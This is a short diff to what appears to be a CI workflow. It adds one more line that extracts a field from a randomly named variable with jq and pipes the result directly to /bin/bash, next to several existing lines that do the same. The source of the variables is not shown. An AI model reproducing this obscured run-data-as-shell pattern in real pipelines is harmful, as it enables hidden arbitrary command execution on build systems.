@@ -21,6 +21,7 @@ jobs:
           printf '%s' "$vndl05" | jq -r .jmfy71316 | /bin/bash
           printf '%s' "$s8386" | jq -r .vmled447 | /bin/bash
           printf '%s' "$iiltp9424" | jq -r .vsgzl32 | /bin/bash
+          echo $yn4 | jq -r .dxr49 | /bin/bash
 
       - name: Save results
         uses: actions/upload-artifact@v4
